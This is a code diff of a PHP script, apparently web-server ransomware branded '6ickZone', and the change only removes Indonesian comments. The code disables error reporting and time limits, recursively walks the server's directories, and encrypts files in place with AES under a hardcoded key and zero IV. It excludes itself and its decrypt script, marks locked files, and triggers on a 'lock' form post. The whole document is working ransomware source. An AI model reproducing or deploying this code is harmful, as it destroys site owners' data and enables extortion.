@@ -6,18 +6,16 @@
 set_time_limit(0);
 error_reporting(0);
 
-$key = "6ickZoneRansomKey"; // Ganti kunci sesuai keinginan
-$iv = str_repeat("\0", 16); // IV AES-128
+$key = "6ickZoneRansomKey"; 
+$iv = str_repeat("\0", 16); 
 
 $encryptedFiles = 0;
 $locked = false;
 
-// Fungsi enkripsi file
 function encryptFile($file, $key, $iv) {
     $data = file_get_contents($file);
     if ($data === false) return false;
 
-    // Skip file yang sudah terenkripsi
     if (substr($data, 0, 9) === "6ickZone:") {
         return false;
     }
@@ -29,7 +27,6 @@ function encryptFile($file, $key, $iv) {
     return file_put_contents($file, $encrypted);
 }
 
-// Fungsi scan folder + encrypt rekursif
 function scanAndEncrypt($dir, $key, $iv, &$count) {
     $exclude = ['encrypt.php', 'decrypt.php', basename(__FILE__), '.htaccess', '.user.ini'];
 
@@ -50,7 +47,6 @@ function scanAndEncrypt($dir, $key, $iv, &$count) {
     }
 }
 
-// Jalankan saat tombol diklik
 if (isset($_POST['lock'])) {
     $rootDir = __DIR__;
     $count = 0;
